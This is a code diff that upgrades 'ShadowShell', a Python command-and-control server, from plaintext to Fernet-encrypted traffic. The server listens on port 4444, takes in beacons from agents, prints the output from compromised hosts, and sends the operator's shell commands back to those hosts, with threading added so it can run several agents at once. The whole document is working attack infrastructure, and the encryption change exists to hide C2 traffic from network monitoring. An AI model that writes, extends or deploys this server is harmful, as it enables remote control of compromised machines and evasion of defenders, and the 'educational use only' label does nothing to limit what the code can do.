@@ -1,31 +1,47 @@
 import socket
 import threading
 import argparse
+from cryptography.fernet import Fernet
 
-# ShadowShell C2 Server (Plaintext Prototype)
+# ShadowShell C2 Server (Encrypted)
 # Educational use only. Authorized lab testing only.
 
-def handle_agent(conn, addr):
-    print(f"[+] Beacon received from {addr[0]}:{addr[1]}")
+def load_key():
+    try:
+        with open("secret.key", "rb") as key_file:
+            return key_file.read()
+    except FileNotFoundError:
+        print("[-] secret.key not found. Run generate_key.py first!")
+        exit(1)
+
+def handle_agent(conn, addr, fernet):
+    print(f"[+] Encrypted beacon received from {addr[0]}:{addr[1]}")
     
-    # Wrap in a try/except to handle agent disconnects gracefully
     try:
         while True:
-            # 1. Wait for the agent's initial check-in or previous command output
-            data = conn.recv(4096).decode('utf-8')
-            if not data:
-                break # Connection closed by agent
-            
-            print(f"\n[Agent Output]:\n{data}")
-            
-            # 2. Prompt the operator for the next command
-            cmd = input("ShadowShell (cmd)> ")
-            if cmd.lower() in ['exit', 'quit']:
-                conn.send(b'exit')
+            # 1. Receive encrypted data and decrypt it
+            encrypted_data = conn.recv(4096)
+            if not encrypted_data:
                 break
             
-            # 3. Send the command to the agent
-            conn.send(cmd.encode('utf-8'))
+            try:
+                decrypted_data = fernet.decrypt(encrypted_data).decode('utf-8')
+            except Exception:
+                print(f"[-] Failed to decrypt payload from {addr[0]}. Discarding.")
+                break
+            
+            print(f"\n[Agent Output]:\n{decrypted_data}")
+            
+            # 2. Prompt operator for command
+            cmd = input("ShadowShell (cmd)> ")
+            if cmd.lower() in ['exit', 'quit']:
+                encrypted_cmd = fernet.encrypt(b'exit')
+                conn.send(encrypted_cmd)
+                break
+            
+            # 3. Encrypt command and send
+            encrypted_cmd = fernet.encrypt(cmd.encode('utf-8'))
+            conn.send(encrypted_cmd)
             
     except ConnectionResetError:
         print(f"[-] Agent {addr[0]} disconnected abruptly.")
@@ -35,7 +51,7 @@ def handle_agent(conn, addr):
         print(f"[-] Closing connection to {addr[0]}:{addr[1]}")
         conn.close()
 
-def start_server(host, port):
+def start_server(host, port, fernet):
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     server.bind((host, port))
@@ -44,6 +60,7 @@ def start_server(host, port):
     print(f"""
     =============================================
        ShadowShell Educational C2 - Server
+       Encryption: ENABLED (Fernet)
        Listening on {host}:{port}
        Waiting for beacons...
        (Press Ctrl+C to exit)
@@ -52,11 +69,8 @@ def start_server(host, port):
     
     try:
         while True:
-            # Accept incoming agent connections
             agent_conn, agent_addr = server.accept()
-            
-            # Handle each agent in a new thread so we can manage multiple beacons
-            thread = threading.Thread(target=handle_agent, args=(agent_conn, agent_addr))
+            thread = threading.Thread(target=handle_agent, args=(agent_conn, agent_addr, fernet))
             thread.start()
     except KeyboardInterrupt:
         print("\n[!] Server shutting down.")
@@ -69,4 +83,6 @@ if __name__ == "__main__":
     parser.add_argument("--port", type=int, default=4444, help="Port to listen on (default: 4444)")
     args = parser.parse_args()
     
-    start_server(args.host, args.port)
+    key = load_key()
+    fernet = Fernet(key)
+    start_server(args.host, args.port, fernet)
